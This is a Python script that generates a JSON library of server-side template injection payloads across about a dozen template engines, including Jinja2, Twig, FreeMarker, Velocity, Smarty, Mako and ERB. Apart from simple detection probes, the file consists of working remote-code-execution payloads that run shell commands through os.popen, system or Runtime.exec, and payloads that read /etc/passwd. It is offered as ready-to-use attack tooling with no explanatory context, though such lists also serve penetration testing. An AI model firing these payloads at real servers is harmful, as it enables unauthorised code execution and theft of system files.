#!/usr/bin/env python3
"""Generate massive SSTI payload library"""
import json

payloads = []

# Template engines and their test payloads
engines = {
    'jinja2': [
        '{{7*7}}', '${7*7}', '{{config}}', '{{self}}', 
        '{{"".__class__.__mro__}}', '{{"".__class__.__mro__[2].__subclasses__()}}',
        '{{request}}', '{{request.application.__globals__}}',
        '{{config.__class__.__init__.__globals__}}',
        '{{cycler.__init__.__globals__.os.popen("id").read()}}',
        '{{lipsum.__globals__["os"].popen("id").read()}}',
        '{{joiner.__init__.__globals__.os.popen("id").read()}}',
        '{{namespace.__init__.__globals__.os.popen("id").read()}}',
        '{{config.items()}}',
        '{{"".__class__.__mro__[1].__subclasses__()}}',
        '{{get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read()}}',
    ],
    'twig': [
        '{{7*7}}', '{{7*"7"}}', '{{_self.env.registerUndefinedFilterCallback("exec")}}',
        '{{_self.env.getFilter("cat /etc/passwd")}}',
        '{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}',
    ],
    'freemarker': [
        '${7*7}', '${7*\'7\'}', '#{7*7}', 
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
        '${"freemarker.template.utility.Execute"?new()("id")}',
    ],
    'velocity': [
        '#set($x=7*7)$x', '#set($x="".class)$x',
        '#set($c=$x.forName("java.lang.Runtime"))#set($m=$c.getMethod("getRuntime",null))#set($r=$m.invoke(null,null))$r.exec("id")',
    ],
    'smarty': [
        '{$x=7*7}', '{$x=7*\'7\'}', '{php}echo id;{/php}',
        '{system(\'id\')}', '{exec(\'id\')}',
    ],
    'mako': [
        '${7*7}', '${self.__class__.__mro__}',
        '${self.__class__.__mro__[2].__subclasses__()}',
        '${"".__class__.__mro__[2].__subclasses__()}',
        '{% import os %}{{os.popen("id").read()}}',
    ],
    'jade': [
        '= 7*7', '= function(){return 7*7}()',
        '!= function(){return 7*7}()',
    ],
    'erb': [
        '<%= 7*7 %>', '<%= system("id") %>',
        '<%= `id` %>', '<%= IO.popen("id").read() %>',
    ],
    'django': [
        '{{7*7}}', '{{7*\'7\'}}', '{% debug %}',
        '{% csrf_token %}',
    ],
    'angular': [
        '{{7*7}}', '{{constructor.constructor("alert(1)")()}}',
        '{{$on.constructor("alert(1)")()}}',
        '{{a="constructor";b="constructor";a[b]("alert(1)")()}}',
    ],
    'nunjucks': [
        '{{7*7}}', '{{range(1,2)}}',
        '{{"".__proto__}}',
    ],
    'python': [
        '{7*7}', '${7*7}', 
        '%s' % str(7*7),
        '{0}'.format(7*7),
    ],
    'plain': [
        '7*7={{7*7}}', '7*7=${7*7}', 
        '#{7*7}', '*{7*7}',
        '{{7*7}}', '{{7*\'7\'}}',
        '${7*7}', '#{7*7}',
    ],
}

for engine, payload_list in engines.items():
    for p in payload_list:
        payloads.append([f'ssti_{engine}', p])

# RCE-focused SSTI payloads
rce_payloads = [
    ('rce_jinja', "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}"),
    ('rce_jinja', "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"),
    ('rce_twig', "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}"),
    ('rce_freemarker', "${'freemarker.template.utility.Execute'?new()('id')}"),
    ('rce_smarty', "{system('id')}"),
    ('rce_velocity', "#set($c=$x.forName('java.lang.Runtime'))#set($m=$c.getMethod('getRuntime',null))#set($r=$m.invoke(null,null))$r.exec('id')"),
    ('rce_erb', "<%= system('id') %>"),
    ('rce_mako', "${self.__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}"),
    ('rce_nunjucks', "{{range.constructor('return 7*7')()}}"),
]
for t, p in rce_payloads:
    payloads.append([t, p])

print(f'Total SSTI payloads generated: {len(payloads)}')
with open('payloads_ssti.json', 'w') as f:
    json.dump({'count': len(payloads), 'payloads': payloads}, f)
print('Saved to payloads_ssti.json')
